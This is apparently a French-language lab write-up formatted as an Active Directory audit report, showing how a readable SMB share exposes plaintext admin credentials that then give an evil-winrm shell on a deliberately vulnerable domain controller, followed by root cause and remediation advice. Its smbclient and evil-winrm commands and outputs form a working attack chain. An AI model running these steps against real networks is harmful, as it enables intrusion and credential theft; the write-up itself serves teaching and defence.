Voici une version prête à être intégrée dans ton dépôt GitHub.

# Rapport d'audit Active Directory – Exposition d'identifiants via un partage SMB

## Informations générales

| Élément               | Valeur              |
| --------------------- | ------------------- |
| Domaine               | ADLAB.LOCAL         |
| Contrôleur de domaine | DC01                |
| Système               | Windows Server 2022 |
| Machine d'attaque     | Kali Linux          |
| Adresse IP cible      | 192.168.56.10       |

---

# Objectif

L'objectif de ce scénario est de démontrer comment une mauvaise configuration d'un partage SMB peut conduire à la compromission complète d'un contrôleur de domaine.

Dans ce laboratoire, un simple utilisateur du domaine possède un accès en lecture sur un partage contenant des informations sensibles. Ces informations permettent ensuite d'obtenir un accès administrateur via WinRM.

> **Contexte :** ce scénario est réalisé dans un laboratoire Active Directory personnel volontairement vulnérable à des fins pédagogiques.

---

# Schéma d'attaque

```text
Utilisateur du domaine
        │
        ▼
Énumération SMB
        │
        ▼
Accès au partage Public
        │
        ▼
Découverte de Backup_notes.txt
        │
        ▼
Extraction des identifiants
        │
        ▼
Connexion WinRM
        │
        ▼
Compromission du contrôleur de domaine
```

---

# Étape 1 — Énumération du partage SMB

Connexion au partage Public avec un utilisateur du domaine.

```bash
smbclient //192.168.56.10/Public -U lmoumen
```

### Résultat

```text
Password for [WORKGROUP\lmoumen]:
Try "help" to get a list of possible commands.
```

Une fois connecté :

```bash
ls
```

### Résultat

```text
.

..

Backup_notes.txt

public.txt
```

---

# Étape 2 — Téléchargement d'un fichier sensible

Téléchargement du fichier :

```bash
get Backup_notes.txt
```

### Résultat

```text
getting file \Backup_notes.txt.txt of size 40 as Backup_notes.txt
```

Retour sur Kali :

```bash
ls
```

```text
Backup_notes.txt
```

Lecture du fichier :

```bash
cat Backup_notes.txt
```

### Contenu

```text
account:dc01@adlab.local
mdp:ADLab2026!
```

---

# Analyse

Le partage SMB contient un fichier exposant des identifiants administratifs en clair.

Cette situation représente une fuite critique d'informations permettant à un attaquant de compromettre le domaine.

---

# Étape 3 — Exploitation des identifiants

Les identifiants récupérés sont utilisés afin d'établir une connexion WinRM vers le contrôleur de domaine.

Commande utilisée :

```bash
evil-winrm -i 192.168.56.10 -u Administrateur -p 'ADLab2026!'
```

### Résultat

```text
Evil-WinRM shell v3.9

Info: Establishing connection...

*Evil-WinRM* PS
```

L'authentification réussit immédiatement.

Le contrôleur de domaine est désormais administrable à distance.

---

# Étape 4 — Vérification des privilèges

Répertoire courant :

```powershell
pwd
```

Résultat :

```text
Path
----
C:\Users\Administrateur\Documents
```

Navigation dans le profil Administrateur :

```powershell
cd ..

ls
```

Résultat :

```text
Desktop
Documents
Downloads
Favorites
Music
Pictures
Videos
...
```

Le compte possède des privilèges administrateur sur le contrôleur de domaine.

---

# Étape 5 — Exploration du système

Navigation jusqu'à la racine du système :

```powershell
cd C:\

ls
```

Résultat :

```text
Partages
Program Files
Users
Windows
```

Découverte des différents partages :

```powershell
cd Partages

ls
```

Résultat :

```text
Acceuil
BTP
Public
RH
```

---

# Étape 6 — Accès aux ressources internes

Navigation dans le dossier BTP :

```powershell
cd BTP

ls
```

Résultat :

```text
btp.txt
```

Lecture du fichier :

```powershell
type btp.txt
```

Résultat :

```text
FLAG FLAG FLAG !
```

L'attaquant possède désormais un accès complet aux ressources internes du serveur.

---

# Cause racine

La compromission est rendue possible par plusieurs erreurs de configuration :

* Un partage SMB est accessible à un utilisateur standard.
* Des identifiants administratifs sont stockés en clair dans un fichier texte.
* Les identifiants sont réutilisés pour l'administration distante via WinRM.
* Aucune séparation n'existe entre les informations de sauvegarde et les comptes privilégiés.

---

# Impact

Un attaquant disposant d'un simple compte utilisateur du domaine peut :

* Énumérer les partages SMB.
* Télécharger des fichiers sensibles.
* Récupérer des identifiants administratifs.
* Ouvrir une session PowerShell distante via WinRM.
* Prendre le contrôle du contrôleur de domaine.
* Accéder aux ressources internes de l'entreprise.

---

# Niveau de criticité

**Critique**

La divulgation d'identifiants administratifs conduit directement à une compromission complète de l'environnement Active Directory.

---

# Recommandations

* Ne jamais stocker de mots de passe en clair.
* Utiliser un gestionnaire de secrets.
* Restreindre les permissions des partages SMB selon le principe du moindre privilège.
* Mettre en place des comptes d'administration dédiés.
* Désactiver WinRM lorsqu'il n'est pas nécessaire.
* Auditer régulièrement les partages réseau et les fichiers sensibles.
* Sensibiliser les administrateurs aux risques liés au stockage de secrets.

---

# Conclusion

Cette démonstration met en évidence qu'une erreur de configuration apparemment anodine peut conduire à la compromission complète d'un environnement Active Directory.

L'accès à un simple partage SMB contenant des informations sensibles permet à un attaquant de récupérer des identifiants privilégiés, d'ouvrir une session WinRM avec des droits administrateur et d'obtenir un contrôle total du contrôleur de domaine.

Ce scénario illustre l'importance d'une gestion rigoureuse des permissions SMB, de la protection des informations sensibles et du respect du principe du moindre privilège dans un environnement Active Directory.
